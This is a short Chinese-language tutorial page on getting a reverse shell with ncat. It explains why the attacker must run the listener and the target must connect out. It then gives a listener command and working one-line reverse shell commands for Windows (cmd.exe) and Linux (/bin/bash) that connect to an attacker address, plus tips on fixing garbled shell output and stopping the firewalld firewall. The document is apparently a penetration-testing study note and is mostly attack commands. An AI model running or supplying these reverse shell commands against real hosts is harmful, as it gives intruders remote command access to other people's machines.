---
layout: default
title: 通过ncat工具getshell
---

# 基本理论

1.

> * 访问分为<mark>服务端和客户端</mark>
> 
> * 服务端是有公网IP的端、客户端是不需要公网IP的端
> 
> * 连接由客户端发起，服务端等待连接

2.

> * shell分为<mark>正向shell和反向shell</mark>
> 
> * 正向shell是我的shell整到目标主机上去，没啥用，难道让目标来远控我？
> 
> * 反向shell是目标的shell整到我这来，这才有用呢

3.

> * 连接分服务端和客户端
> 
> * 渗透行为分我们和目标
> 
> * ncat只能把客户端的shell反弹到服务端
> 
> * 也就是说，<mark>使用ncat反弹shell时，目标只能是客户端，我们必须是服务端</mark>
> 
> * 我们服务端要有公网IP



# 把自己的端口发出去，等待连接

```batch
ncat -lvvp 8090
rem l listening
rem v verbose
rem v version
rem p port
rem bash也是同样的命令
```

# 目标作为客户端，主动连接我们

## windows

```batch
ncat --exec c:\windows\system32\cmd.exe 172.20.0.1 8090
rem 执行cmd.exe 并发到攻击者主机上去
```

## linux

```bash
ncat --exec /bin/bash 172.20.0.1 8090
# 执行bash，发到攻击者主机上去
```

# 解决getshell乱码

## windows

```batch
chcp 65001
rem 改为utf-8
rem change code page
```

## linux xshell改编码

> * 点击上方小地球

# 关闭firewalld防火墙

```bash
systemctl status firewalld.service # 1
systemctl stop firewalld.service # 2
```
